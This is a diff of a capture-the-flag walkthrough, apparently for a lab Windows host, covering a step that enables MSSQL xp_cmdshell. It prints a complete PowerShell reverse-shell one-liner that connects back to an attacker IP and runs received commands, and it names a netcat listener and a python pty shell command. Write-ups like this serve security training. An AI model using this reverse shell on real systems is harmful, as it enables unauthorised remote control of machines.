@@ -47,8 +47,10 @@ This will allow us to enable xp_cmdshell and gain RCE on the host. Now since we 
 $client = New-Object System.Net.Sockets.TCPClient("10.10.xx.x",8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 and upload this shell script to target from attacing machine. Start netcat listner on attacking machine to listen.
-And Boom!! we have a reverse shell. Stabllize the shell ```python
-# python3 -c "import pty;pty.spawn("/bin/bash")" ```
+And Boom!! we have a reverse shell. Stabllize the shell 
+```bash
+# python3 -c "import pty;pty.spawn("/bin/bash")"
+```
 
 Now lets get the user.txt flag on user\desktop and print it.
 
